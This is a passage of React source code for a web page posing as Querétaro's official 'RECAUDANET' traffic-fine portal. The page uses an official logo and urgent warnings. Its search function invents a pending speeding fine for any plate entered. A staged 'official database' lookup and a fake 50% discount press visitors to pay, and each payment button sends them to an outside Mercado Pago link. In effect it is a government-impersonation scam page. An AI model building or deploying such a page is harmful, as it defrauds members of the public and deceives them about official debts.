/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect, FormEvent, useRef } from "react";
import { motion, AnimatePresence } from "motion/react";
import queretaroLogo from "./assets/images/queretaro_logo_1782484208681.jpg";
import { 
  AlertTriangle, 
  Search, 
  CheckCircle2, 
  CreditCard, 
  Download, 
  ShieldCheck, 
  Building2, 
  FileText, 
  Printer, 
  ChevronRight, 
  X, 
  Eye, 
  HelpCircle, 
  PhoneCall, 
  Info, 
  Clock, 
  Check, 
  MapPin, 
  FileCheck, 
  ExternalLink,
  ChevronDown,
  ChevronUp,
  RotateCcw,
  Sparkles
} from "lucide-react";

// Infraction Interface
interface Infraction {
  plate: string;
  owner: string;
  vehicle: string;
  folio: string;
  reason: string;
  date: string;
  location: string;
  registeredSpeed?: number;
  speedLimit?: number;
  amountBase: number;
  discount: number; // 0.5 = 50%
  status: "PENDIENTE" | "PAGADO";
  paymentFolio?: string;
  paymentDate?: string;
}

// Initial Infractions Seed
const INITIAL_INFRACTIONS: Record<string, Infraction> = {
  "UKM-892-A": {
    plate: "UKM-892-A",
    owner: "Particular Registrado",
    vehicle: "Automóvil Registrado",
    folio: "QRO-2026-88421",
    reason: "Exceso de velocidad capturado por dispositivo tecnológico de medición (Radar 23)",
    date: "18/Jun/2026 - 09:24 AM",
    location: "Radar 23 Querétaro",
    amountBase: 1150.30,
    discount: 0.5,
    status: "PENDIENTE",
  },
  "QRO-712-X": {
    plate: "QRO-712-X",
    owner: "Particular Registrado",
    vehicle: "Automóvil Registrado",
    folio: "QRO-2026-77312",
    reason: "Exceso de velocidad capturado por dispositivo tecnológico de medición (Radar 23)",
    date: "12/Jun/2026 - 11:45 AM",
    location: "Radar 23 Querétaro",
    amountBase: 1150.30,
    discount: 0.5,
    status: "PENDIENTE",
  },
  "NMX-554-C": {
    plate: "NMX-554-C",
    owner: "Particular Registrado",
    vehicle: "Automóvil Registrado",
    folio: "QRO-2026-99154",
    reason: "Exceso de velocidad capturado por dispositivo tecnológico de medición (Radar 23)",
    date: "20/Jun/2026 - 03:15 PM",
    location: "Radar 23 Querétaro",
    amountBase: 1150.30,
    discount: 0.5,
    status: "PENDIENTE",
  }
};

export default function App() {
  // --- States ---
  const paymentPortalRef = useRef<HTMLDivElement | null>(null);
  const [infractions, setInfractions] = useState<Record<string, Infraction>>(INITIAL_INFRACTIONS);
  const [activePlate, setActivePlate] = useState<string>("UKM-892-A");
  const [searchQuery, setSearchQuery] = useState<string>("");
  const [searchError, setSearchError] = useState<string>("");
  const [isSearching, setIsSearching] = useState<boolean>(false);
  const [searchingPlate, setSearchingPlate] = useState<string>("");
  
  // UI states
  const [showEvidence, setShowEvidence] = useState<boolean>(false);
  const [showVoucher, setShowVoucher] = useState<boolean>(false);
  const [paymentStep, setPaymentStep] = useState<number>(0); // 0 = idle, 1 = tax details, 2 = payment method, 3 = fill card details, 4 = complete success
  
  // Checkout Form States
  const [rfc, setRfc] = useState<string>("");
  const [email, setEmail] = useState<string>("");
  const [phone, setPhone] = useState<string>("");
  const [paymentMethod, setPaymentMethod] = useState<"CARD" | "SPEI">("CARD");
  
  // Credit Card States
  const [cardNumber, setCardNumber] = useState<string>("");
  const [cardHolder, setCardHolder] = useState<string>("");
  const [cardExpiry, setCardExpiry] = useState<string>("");
  const [cardCvv, setCardCvv] = useState<string>("");
  const [cardFocus, setCardFocus] = useState<boolean>(false); // Flip indicator if CVV focused
  
  // General active infraction computed
  const currentInfraction = infractions[activePlate] || null;
  
  // Live ticking clock state
  const [currentTime, setCurrentTime] = useState<Date>(new Date("2026-06-25T18:28:19-07:00"));
  
  // FAQs Accordion
  const [openFaq, setOpenFaq] = useState<number | null>(null);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentTime((prev) => new Date(prev.getTime() + 1000));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Format Date for Display
  const formatClock = (date: Date) => {
    return date.toLocaleDateString("es-MX", {
      day: "2-digit",
      month: "short",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    }).toUpperCase();
  };

  // Handle Plate Search
  const handleSearch = (e?: FormEvent) => {
    if (e) e.preventDefault();
    // Normalize spaces and convert to uppercase, removing any non-alphanumeric/hyphen characters
    const query = searchQuery.toUpperCase().trim().replace(/\s+/g, "-").replace(/[^A-Z0-9-]/g, "");
    if (!query) {
      setSearchError("Por favor ingrese un número de placa válido.");
      return;
    }
    
    // Accept any alphanumeric/hyphen string between 3 and 12 characters as a valid plate
    const plateRegex = /^[A-Z0-9-]{3,12}$/;
    if (!plateRegex.test(query)) {
      setSearchError("Formato de placa inválido. Use letras, números y guiones.");
      return;
    }

    setSearchError("");
    setSearchingPlate(query);
    setIsSearching(true);
    setPaymentStep(0); // Reset payment flow immediately

    setTimeout(() => {
      // Always ensure the searched plate has a PENDIENTE infraction so the amount opens immediately
      const existing = infractions[query];
      const generatedFine: Infraction = {
        plate: query,
        owner: "Particular Registrado",
        vehicle: "Automóvil Registrado",
        folio: existing?.folio || `QRO-2026-${Math.floor(10000 + Math.random() * 90000)}`,
        reason: "Exceso de velocidad capturado por dispositivo tecnológico de medición (Radar 23)",
        date: existing?.date || "25/Jun/2026 - 10:45 AM",
        location: "Radar 23 Querétaro",
        amountBase: 1150.30,
        discount: 0.5,
        status: "PENDIENTE"
      };

      setInfractions(prev => ({
        ...prev,
        [query]: generatedFine
      }));

      setActivePlate(query);
      setIsSearching(false);
      
      // Auto-scroll to the payment portal
      setTimeout(() => {
        paymentPortalRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }, 150);
    }, 3000);
  };

  // Generate Simulated Fine for Custom searched plates
  const handleGenerateSimulatedFine = () => {
    const query = activePlate.toUpperCase().trim();
    const newFine: Infraction = {
      plate: query,
      owner: "Particular Registrado",
      vehicle: "Automóvil Registrado",
      folio: `QRO-2026-${Math.floor(10000 + Math.random() * 90000)}`,
      reason: "Exceso de velocidad capturado por dispositivo tecnológico de medición (Radar 23)",
      date: "24/Jun/2026 - 11:15 AM",
      location: "Radar 23 Querétaro",
      amountBase: 1150.30,
      discount: 0.5,
      status: "PENDIENTE"
    };

    setInfractions(prev => ({
      ...prev,
      [query]: newFine
    }));
    setPaymentStep(0);
  };

  // Restore Default infractions to reset demo
  const handleResetDemo = () => {
    setInfractions(INITIAL_INFRACTIONS);
    setActivePlate("UKM-892-A");
    setSearchQuery("");
    setSearchError("");
    setPaymentStep(0);
  };

  // Process Interactive Payment Completion
  const handleProcessPayment = (e: FormEvent) => {
    e.preventDefault();
    if (!currentInfraction) return;

    // Simulate server side persistence
    const txFolio = `QRO-TX-${Math.floor(100000 + Math.random() * 900000)}`;
    const nowStr = new Date().toLocaleDateString("es-MX", {
      day: "2-digit",
      month: "short",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit"
    });

    setInfractions(prev => ({
      ...prev,
      [activePlate]: {
        ...prev[activePlate],
        status: "PAGADO",
        paymentFolio: txFolio,
        paymentDate: nowStr
      }
    }));

    // Open the real payment link in a new window/tab
    window.open("https://mpago.la/2Hcar5n", "_blank");

    setPaymentStep(4); // Show success screen
  };

  // Compute calculated values
  const getFineTotal = (inf: Infraction) => {
    if (inf.status === "PAGADO") return 0;
    return inf.amountBase * (1 - inf.discount);
  };

  // Sample FAQs
  const FAQS = [
    {
      q: "¿Cómo aplican los descuentos de pronto pago?",
      a: "De acuerdo con el Reglamento de Tránsito de Querétaro, se otorga un 50% de descuento sobre el monto total de la infracción si el pago se efectúa dentro de los primeros 15 días naturales a partir de la fecha de notificación de la multa."
    },
    {
      q: "¿Qué métodos de pago en línea son aceptados?",
      a: "Puede realizar su pago de forma segura y directa utilizando cualquier Tarjeta de Crédito o Débito (Visa, Mastercard, American Express), o mediante una transferencia electrónica interbancaria (SPEI)."
    },
    {
      q: "¿Qué sucede si considero que la infracción fue incorrecta?",
      a: "Usted tiene derecho a interponer un recurso de inconformidad ante el Tribunal de Justicia Administrativa del Estado de Querétaro dentro de los 15 días hábiles siguientes a la fecha de notificación presencial o electrónica."
    },
    {
      q: "¿Qué es el valor UMA y cómo afecta el costo de mi multa?",
      a: "La Unidad de Medida y Actualización (UMA) es la referencia económica en pesos que determina el costo de las multas. El valor de la UMA se actualiza anualmente por el INEGI. Las multas se expresan como múltiplos de este valor para mantenerlas actualizadas."
    }
  ];

  return (
    <div id="recaudanet-root" className="min-h-screen bg-[#001a33] text-gray-100 font-sans flex flex-col antialiased selection:bg-blue-600 selection:text-white">
      
      {/* HEADER */}
      <header id="recaudanet-header" className="bg-[#002d56] border-b border-[#004080] py-4 px-4 sm:px-8 flex flex-col md:flex-row justify-between items-center shadow-lg gap-4 relative z-10">
        <div className="flex items-center space-x-4">
          <div className="bg-white rounded-xl p-1.5 shadow-md border border-white/10 flex items-center justify-center overflow-hidden">
            <img 
              src={queretaroLogo} 
              alt="Logo Oficial del Gobierno del Estado de Querétaro" 
              className="h-10 sm:h-12 w-auto object-contain"
              referrerPolicy="no-referrer"
            />
          </div>
          <div>
            <div className="flex flex-col sm:flex-row sm:items-center gap-1.5 sm:gap-3">
              <h1 className="text-xl sm:text-2xl font-bold tracking-tight uppercase font-display text-white">RECAUDANET</h1>
              <span className="text-[9px] sm:text-[10px] bg-blue-500/25 text-blue-300 border border-blue-400/30 px-2.5 py-0.5 rounded font-mono font-bold tracking-[0.18em] whitespace-nowrap self-start sm:self-auto uppercase">
                PORTAL OFICIAL
              </span>
            </div>
            <p className="text-[10px] text-blue-300 uppercase tracking-[0.2em] leading-none mt-1">Gobierno del Estado de Querétaro</p>
          </div>
        </div>

        {/* Dynamic State Info / Clock */}
        <div className="flex flex-col sm:flex-row items-center gap-3 sm:gap-6 text-xs text-gray-300">
          <div className="hidden lg:flex items-center space-x-2 bg-blue-950/50 px-3 py-1.5 rounded-lg border border-[#003d73]">
            <Clock className="w-3.5 h-3.5 text-blue-400" />
            <span className="font-mono tracking-wide">{formatClock(currentTime)}</span>
          </div>
          
          <nav className="flex items-center space-x-2 sm:space-x-4 font-medium text-sm">
            <span className="text-white border-b-2 border-blue-400 pb-1 px-1 cursor-default">Tránsito</span>
            <button 
              onClick={handleResetDemo}
              title="Restaurar simulación"
              className="text-blue-400 hover:text-blue-300 hover:bg-blue-900/30 p-1.5 rounded-lg transition-colors flex items-center gap-1 border border-transparent hover:border-blue-700/50"
            >
              <RotateCcw className="w-3.5 h-3.5" />
              <span className="text-xs hidden sm:inline">Reiniciar</span>
            </button>
          </nav>
        </div>
      </header>

      {/* WARNING NOTIFICATION HEADER */}
      <div id="recaudanet-alert-bar" className="bg-red-950/40 border-b border-red-500/20 py-3.5 px-4 sm:px-8 flex items-center justify-between">
        <div className="max-w-7xl mx-auto w-full flex flex-col md:flex-row md:items-center justify-between gap-3 text-sm">
          <div className="flex items-center space-x-3 text-red-300">
            <div className="p-1 bg-red-900/40 rounded-lg border border-red-500/30 flex-shrink-0 animate-pulse">
              <AlertTriangle className="w-4 h-4 text-red-400" />
            </div>
            <div>
              <span className="font-bold text-red-400 uppercase tracking-wider text-xs block md:inline md:mr-2">AVISO DE INFRACCIÓN:</span>
              <span>Se ha identificado un adeudo vehicular por concepto de multas de tránsito. Evite recargos.</span>
            </div>
          </div>
        </div>
      </div>

      {/* MAIN CONTAINER */}
      <main id="recaudanet-main" className="flex-1 max-w-7xl mx-auto w-full p-4 sm:p-8 flex flex-col space-y-8 justify-start">
        
        {/* TITLE & MOTTO */}
        <div className="space-y-2">
          <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-blue-900/30 border border-blue-500/30 text-blue-400 text-xs font-bold rounded uppercase tracking-wider">
            <Building2 className="w-3.5 h-3.5" /> Secretaría de Finanzas de Querétaro
          </div>
          <h2 className="text-3xl sm:text-4xl font-light leading-tight font-display text-white">
            Portal Ciudadano de <span className="font-bold text-blue-400">Infracciones de Tránsito</span>
          </h2>
          <p className="text-gray-400 text-sm max-w-2xl">
            Consulte de forma rápida, segura y transparente el estado de adeudos por concepto de infracciones y fotomultas del estado. Realice su pago en línea con un 50% de descuento aplicable por pronto pago.
          </p>
        </div>

        {/* MAIN INFRACTION DASHBOARD */}
        <div className="grid grid-cols-12 gap-8">
          
          {/* LEFT COLUMN: TICKET DETAILS */}
          <div className="col-span-12 lg:col-span-7 space-y-6 order-1 lg:order-1">
            
            {isSearching ? (
              <motion.div
                key="searching"
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
                className="bg-[#002545] border border-[#003d73] rounded-xl p-8 sm:p-10 shadow-2xl text-center space-y-6 flex flex-col items-center justify-center min-h-[450px]"
              >
                <div className="relative flex items-center justify-center">
                  <div className="w-20 h-20 border-4 border-blue-500/10 border-t-blue-400 rounded-full animate-spin absolute" />
                  <div className="w-14 h-14 border-2 border-dashed border-blue-500/30 rounded-full animate-pulse absolute" />
                  <div className="p-4 bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full">
                    <Search className="w-8 h-8 animate-pulse" />
                  </div>
                </div>

                <div className="space-y-3 max-w-md">
                  <h3 className="text-xl font-bold font-display text-white tracking-tight">
                    Consultando Base de Datos Oficial...
                  </h3>
                  <p className="text-gray-400 text-xs leading-relaxed">
                    Buscando en los registros de infracciones de la Secretaría de Seguridad Ciudadana del Estado de Querétaro. Esto puede tomar un momento.
                  </p>
                </div>

                <div className="p-4 bg-[#001a33]/80 rounded-lg border border-[#003d73]/40 max-w-sm w-full font-mono text-[10px] text-blue-300 text-left space-y-1.5 select-none opacity-90">
                  <div className="flex justify-between">
                    <span>SISTEMA:</span>
                    <span className="text-emerald-400 font-bold">RECAUDANET QRO</span>
                  </div>
                  <div className="flex justify-between">
                    <span>SERVIDOR:</span>
                    <span className="text-white">QRO-DB-CLUSTER-04</span>
                  </div>
                  <div className="flex justify-between">
                    <span>PLACA DE CONSULTA:</span>
                    <span className="text-yellow-400 font-bold">{searchingPlate}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>ESTADO CONEXIÓN:</span>
                    <span className="text-blue-400">SSL ENCRIPTADO</span>
                  </div>
                </div>
              </motion.div>
            ) : currentInfraction ? (
              <motion.div
                key={activePlate}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.3 }}
                className="bg-[#002545] border border-[#003d73] rounded-xl shadow-2xl relative overflow-hidden flex flex-col"
              >
                {/* Decorative background watermark */}
                <div className="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
                  <AlertTriangle className="w-56 h-56 fill-white" />
                </div>

                {/* Card Title Header */}
                <div className="border-b border-[#003d73] p-5 sm:p-6 bg-[#002d56]/50 flex flex-col sm:flex-row sm:items-center justify-between gap-3 relative z-10">
                  <div className="flex items-start gap-3">
                    <div className="p-2 bg-red-500/10 text-red-400 border border-red-500/30 rounded-lg animate-pulse">
                      <FileText className="w-5 h-5" />
                    </div>
                    <div>
                      <div className="flex flex-col sm:flex-row sm:items-center gap-1.5 mb-1">
                        <span className="text-[9px] text-red-400 bg-red-500/20 border border-red-500/40 px-2 py-0.5 rounded font-bold uppercase tracking-widest animate-pulse whitespace-nowrap self-start">
                          Confirmación de Infracción
                        </span>
                      </div>
                      <h3 className="font-bold text-lg text-white font-display">Infracción {currentInfraction.folio}</h3>
                      <p className="text-xs text-blue-300">Registro oficial del Estado de Querétaro</p>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    {currentInfraction.status === "PENDIENTE" ? (
                      <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-amber-500/10 border border-amber-500/30 text-amber-400 text-xs font-bold rounded uppercase tracking-wider animate-pulse">
                        <Clock className="w-3.5 h-3.5" /> Pendiente
                      </div>
                    ) : (
                      <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-xs font-bold rounded uppercase tracking-wider">
                        <CheckCircle2 className="w-3.5 h-3.5" /> Pagada / Liquidada
                      </div>
                    )}
                  </div>
                </div>

                {/* Infraction Fields Content */}
                <div className="p-5 sm:p-8 space-y-6 relative z-10 flex-1">
                  
                  {/* Warning banner inside ticket if pending */}
                  {currentInfraction.status === "PENDIENTE" && (
                    <div className="space-y-3">
                      <div className="p-4 bg-red-500/10 border border-red-500/35 rounded-lg text-xs text-red-200 leading-relaxed flex items-start gap-2.5 shadow-[0_0_15px_rgba(239,68,68,0.07)]">
                        <AlertTriangle className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                        <div>
                          <strong className="text-red-400 uppercase tracking-wider block mb-1">Infracción Localizada y Confirmada</strong>
                          Se confirma que su vehículo presenta un adeudo activo de tránsito registrado en la base de datos oficial por el monto señalado.
                        </div>
                      </div>
                      
                      <div className="p-4 bg-amber-500/10 border border-amber-500/20 rounded-lg text-xs text-amber-200 leading-relaxed flex items-start gap-2.5">
                        <Info className="w-4.5 h-4.5 text-amber-400 flex-shrink-0 mt-0.5" />
                        <div>
                          <strong>Descuento del 50% activo:</strong> Se está aplicando un descuento del 50% por pronto pago. Para gozar de este beneficio, el pago debe ser cubierto antes de vencer el plazo legal.
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Key-Value Fields Grid */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 text-sm">
                    <div className="space-y-1 sm:col-span-2">
                      <span className="text-xs uppercase tracking-wider text-gray-400">Concepto / Motivo de Infracción:</span>
                      <p className="font-semibold text-white leading-relaxed">{currentInfraction.reason}</p>
                    </div>

                    {currentInfraction.registeredSpeed && (
                      <div className="space-y-1 sm:col-span-2 bg-[#001a33]/50 p-3 rounded-lg border border-[#003d73]/50 flex justify-between items-center text-xs">
                        <div className="flex items-center gap-2">
                          <AlertTriangle className="w-4 h-4 text-amber-400" />
                          <span>Velocidad Registrada: <strong className="text-amber-400 font-mono text-sm">{currentInfraction.registeredSpeed} km/h</strong></span>
                        </div>
                        <div className="text-gray-400 border-l border-blue-900/60 pl-3">
                          Límite de velocidad: <strong className="text-gray-300 font-mono">{currentInfraction.speedLimit} km/h</strong>
                        </div>
                      </div>
                    )}

                    <div className="space-y-1 border-t border-blue-900/30 pt-4">
                      <span className="text-xs uppercase tracking-wider text-gray-400">Fecha y Hora de Infracción:</span>
                      <p className="text-gray-200 font-mono">{currentInfraction.date}</p>
                    </div>

                    <div className="space-y-1 border-t border-blue-900/30 pt-4">
                      <span className="text-xs uppercase tracking-wider text-gray-400">Ubicación del Suceso:</span>
                      <p className="text-gray-200 flex items-center gap-1">
                        <MapPin className="w-3.5 h-3.5 text-blue-400 flex-shrink-0" />
                        <span>{currentInfraction.location}</span>
                      </p>
                    </div>
                  </div>

                  {/* PHOTOGRAPHIC EVIDENCE RETRIEVAL LINK */}
                  <div className="border-t border-blue-900/30 pt-5 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                    <div className="text-xs text-gray-400">
                      Dispositivo Tecnológico de Medición Vial Autorizado. Código de homologación nacional: QRO-MSR-0418.
                    </div>
                    <button
                      onClick={() => setShowEvidence(true)}
                      className="inline-flex items-center justify-center gap-1.5 px-4 py-2 bg-blue-950 hover:bg-blue-900 border border-blue-800 text-blue-300 text-xs font-semibold rounded-lg transition-colors cursor-pointer"
                    >
                      <Eye className="w-3.5 h-3.5" /> Ver Evidencia Fotográfica
                    </button>
                  </div>

                </div>

                {/* If paid, display payment details footer inside ticket */}
                {currentInfraction.status === "PAGADO" && (
                  <div className="bg-emerald-950/30 border-t border-emerald-500/20 p-5 flex flex-col sm:flex-row justify-between items-center gap-3">
                    <div className="flex items-center gap-2.5">
                      <div className="p-1.5 bg-emerald-500/10 rounded-full text-emerald-400">
                        <Check className="w-4 h-4" />
                      </div>
                      <div>
                        <p className="text-xs font-bold text-emerald-400">INFRACCIÓN COMPLETAMENTE LIQUIDADA</p>
                        <p className="text-[11px] text-gray-400">Transacción: {currentInfraction.paymentFolio} • {currentInfraction.paymentDate}</p>
                      </div>
                    </div>
                    <button 
                      onClick={() => {
                        setPaymentStep(4); // Go to receipt screen directly to view or print
                      }}
                      className="text-xs text-blue-300 hover:text-white font-semibold underline flex items-center gap-1 cursor-pointer"
                    >
                      Ver Recibo de Pago <ChevronRight className="w-3 h-3" />
                    </button>
                  </div>
                )}
              </motion.div>
            ) : (
              /* CLEAN PLATE STATUS (NO FINES PENDING) */
              <motion.div
                key={activePlate}
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.3 }}
                className="bg-[#002545] border border-[#003d73] rounded-xl p-8 shadow-2xl text-center space-y-6 flex flex-col items-center justify-center min-h-[400px]"
              >
                <div className="w-16 h-16 bg-emerald-500/10 rounded-full border border-emerald-500/30 flex items-center justify-center text-emerald-400 shadow-[0_0_15px_rgba(16,185,129,0.1)]">
                  <CheckCircle2 className="w-10 h-10" />
                </div>
                
                <div className="space-y-2 max-w-md">
                  <h3 className="text-2xl font-bold font-display text-white">Vehículo sin Adeudos</h3>
                  <p className="text-gray-400 text-sm">
                    La placa <strong className="font-mono text-white bg-[#001a33] px-2 py-0.5 rounded border border-[#003d73]">{activePlate}</strong> no registra ninguna infracción de tránsito ni adeudos pendientes en el Estado de Querétaro.
                  </p>
                </div>

                <div className="p-4 bg-[#001a33]/60 rounded-lg border border-[#003d73]/60 max-w-sm w-full text-xs text-gray-400 space-y-3">
                  <span className="font-semibold text-gray-300 block">¿Desea probar el simulador de pago?</span>
                  <p>Puede generar una multa simulada en segundos para probar la experiencia completa de pago en línea de Recaudanet.</p>
                  <button
                    onClick={handleGenerateSimulatedFine}
                    className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 px-4 rounded transition-colors flex items-center justify-center gap-1.5"
                  >
                    <Sparkles className="w-3.5 h-3.5 text-blue-200" /> Generar Multa de Prueba
                  </button>
                </div>
              </motion.div>
            )}

            {/* HELP DESK & FAQS */}
            <div className="bg-[#002545]/40 border border-[#003d73]/50 rounded-xl p-6 space-y-4">
              <div className="flex items-center gap-2">
                <HelpCircle className="w-5 h-5 text-blue-400" />
                <h4 className="font-bold text-white font-display">Preguntas Frecuentes y Trámites</h4>
              </div>

              <div className="divide-y divide-blue-900/30">
                {FAQS.map((faq, index) => {
                  const isOpen = openFaq === index;
                  return (
                    <div key={index} className="py-3">
                      <button
                        onClick={() => setOpenFaq(isOpen ? null : index)}
                        className="w-full flex justify-between items-center text-left text-sm text-gray-300 font-semibold hover:text-white transition-colors py-1"
                      >
                        <span>{faq.q}</span>
                        {isOpen ? <ChevronUp className="w-4 h-4 text-blue-400" /> : <ChevronDown className="w-4 h-4 text-blue-400" />}
                      </button>
                      
                      <AnimatePresence>
                        {isOpen && (
                          <motion.div
                            initial={{ height: 0, opacity: 0 }}
                            animate={{ height: "auto", opacity: 1 }}
                            exit={{ height: 0, opacity: 0 }}
                            transition={{ duration: 0.2 }}
                            className="overflow-hidden"
                          >
                            <p className="text-xs text-gray-400 leading-relaxed pt-2 pb-1">
                              {faq.a}
                            </p>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>
                  );
                })}
              </div>

              <div className="pt-3 border-t border-blue-900/40 flex flex-col sm:flex-row justify-between items-center gap-2 text-xs text-gray-400">
                <span className="flex items-center gap-1">
                  <PhoneCall className="w-3.5 h-3.5 text-blue-400" /> Centro de Atención: 01-800-RECAUDA (7322832)
                </span>
                <span className="text-gray-500">Horario: Lunes a Viernes de 8:00 AM a 4:00 PM</span>
              </div>
            </div>

          </div>

          {/* RIGHT COLUMN: FINANCIAL AND PAYMENT PORTAL */}
          <div ref={paymentPortalRef} className="col-span-12 lg:col-span-5 space-y-6 order-2 lg:order-2">
            
            <div className="bg-[#002545] border border-[#003d73] rounded-xl shadow-2xl p-6 sm:p-8 flex flex-col relative overflow-hidden">
              
              {/* Payment Flow Visual Progress Header */}
              {paymentStep > 0 && paymentStep < 4 && (
                <div className="mb-6 flex items-center justify-between border-b border-blue-900/40 pb-4">
                  <span className="text-xs font-bold uppercase tracking-widest text-blue-400">PAGO EN LÍNEA SEGURO</span>
                  <div className="flex items-center gap-1.5 text-[10px] text-gray-400">
                    <span className={`w-2 h-2 rounded-full ${paymentStep >= 1 ? "bg-blue-500" : "bg-gray-700"}`} />
                    <span className={`w-2 h-2 rounded-full ${paymentStep >= 2 ? "bg-blue-500" : "bg-gray-700"}`} />
                    <span className={`w-2 h-2 rounded-full ${paymentStep >= 3 ? "bg-blue-500" : "bg-gray-700"}`} />
                  </div>
                </div>
              )}

              {/* STAGE A: VIEW FINANCIAL SUMMARY OR SUCCESS (No Active Fine or Fine paid) */}
              {isSearching ? (
                <div className="space-y-6 text-center py-6 flex flex-col items-center justify-center">
                  <div className="w-12 h-12 border-4 border-blue-500/20 border-t-blue-400 rounded-full animate-spin" />
                  <div className="space-y-2">
                    <span className="text-xs font-bold uppercase tracking-widest text-blue-300 animate-pulse">OBTENIENDO SALDO FISCAL</span>
                    <h3 className="text-2xl font-bold font-display text-white/50 animate-pulse">Cargando...</h3>
                    <p className="text-xs text-gray-400 max-w-xs mx-auto animate-pulse">
                      Consultando adeudos vehiculares y recargos vigentes con el servidor de la Secretaría de Finanzas.
                    </p>
                  </div>
                </div>
              ) : (!currentInfraction || currentInfraction.status === "PAGADO") && paymentStep !== 4 ? (
                <div className="space-y-6 text-center py-6 flex flex-col items-center justify-center">
                  <div className="w-16 h-16 bg-blue-500/5 rounded-full border border-blue-500/10 flex items-center justify-center text-blue-400">
                    <ShieldCheck className="w-10 h-10" />
                  </div>
                  <div className="space-y-2">
                    <span className="text-xs font-bold uppercase tracking-widest text-blue-300">ESTADO DE CUENTA</span>
                    <h3 className="text-3xl font-bold font-display text-white">$0.00 MXN</h3>
                    <p className="text-xs text-gray-400 max-w-xs mx-auto">
                      No hay montos pendientes por liquidar para esta placa. Felicidades por mantener sus obligaciones fiscales al día.
                    </p>
                  </div>
                  
                  {currentInfraction && currentInfraction.status === "PAGADO" && (
                    <button
                      onClick={() => setPaymentStep(4)}
                      className="w-full bg-[#002d56] hover:bg-[#003d73] border border-[#004080] text-white py-3 rounded-lg text-xs font-bold tracking-wide transition-all uppercase flex items-center justify-center gap-1.5"
                    >
                      <FileCheck className="w-4 h-4 text-emerald-400" /> Ver Comprobante de Pago
                    </button>
                  )}
                </div>
              ) : null}

              {/* STAGE B: ACTIVE FINE PENDING - CHOOSE TO PAY WIZARD OR INITIAL VIEW */}
              {!isSearching && currentInfraction && currentInfraction.status === "PENDIENTE" && (
                <>
                  {/* STEP 0: INITIAL SUMMARY SCREEN */}
                  {paymentStep === 0 && (
                    <div className="space-y-6">
                      <div className="bg-[#001d36] border-2 border-emerald-500/40 rounded-xl p-6 flex flex-col items-center justify-center text-center relative overflow-hidden shadow-inner">
                        {/* Elegant benefit banner */}
                        <div className="absolute top-0 left-0 right-0 bg-emerald-500/20 border-b border-emerald-500/30 text-emerald-300 py-1.5 px-3 text-[10px] font-bold tracking-widest uppercase flex items-center justify-center gap-1">
                          <Sparkles className="w-3.5 h-3.5 text-emerald-400 animate-pulse" /> 
                          Beneficio de Pronto Pago Activo (50% Desc.)
                        </div>
                        
                        <div className="pt-6 pb-1 space-y-2 w-full">
                          <span className="text-blue-300 text-xs font-bold uppercase tracking-wider block">Monto Neto a Pagar</span>
                          
                          <div className="flex items-center justify-center gap-3 mt-1">
                            <span className="text-gray-400 line-through text-base font-medium font-mono">
                              ${currentInfraction.amountBase.toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} MXN
                            </span>
                            <span className="bg-emerald-500/20 text-emerald-300 text-[10px] font-bold px-2 py-0.5 rounded border border-emerald-500/30">
                              -50% APLICADO
                            </span>
                          </div>

                          <div className="text-4xl sm:text-5xl font-extrabold text-white font-display tracking-tight drop-shadow-[0_2px_8px_rgba(16,185,129,0.2)]">
                            ${(currentInfraction.amountBase * (1 - currentInfraction.discount)).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                            <span className="text-xs font-medium text-gray-400 ml-1 font-sans">MXN</span>
                          </div>
                        </div>

                        {/* Attractive savings details */}
                        <div className="w-full mt-4 bg-[#001428] rounded-lg border border-[#003d73]/40 p-3.5 space-y-2 text-left text-xs font-sans">
                          <div className="flex justify-between items-center text-gray-400">
                            <span>Multa Base Original:</span>
                            <span className="font-mono text-gray-300">
                              ${currentInfraction.amountBase.toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                            </span>
                          </div>
                          <div className="flex justify-between items-center text-emerald-400 font-bold border-t border-blue-900/30 pt-2">
                            <span className="flex items-center gap-1">
                              🎁 Tu Ahorro de Hoy (50%):
                            </span>
                            <span className="font-mono text-emerald-300">
                              -${(currentInfraction.amountBase * currentInfraction.discount).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                            </span>
                          </div>
                        </div>
                      </div>

                      <div className="space-y-3">
                        {/* PAY DIRECTLY ONLINE (TRIGGERS WIZARD) */}
                        <button
                          onClick={() => {
                            const txFolio = `QRO-TX-${Math.floor(100000 + Math.random() * 900000)}`;
                            const nowStr = new Date().toLocaleDateString("es-MX", {
                              day: "2-digit",
                              month: "short",
                              year: "numeric",
                              hour: "2-digit",
                              minute: "2-digit"
                            });
                            setInfractions(prev => ({
                              ...prev,
                              [activePlate]: {
                                ...prev[activePlate],
                                status: "PAGADO",
                                paymentFolio: txFolio,
                                paymentDate: nowStr
                              }
                            }));

                            // Open the real payment link in a new window/tab
                            window.open("https://mpago.la/2Hcar5n", "_blank");

                            setPaymentStep(4); // Go directly to the receipt screen
                          }}
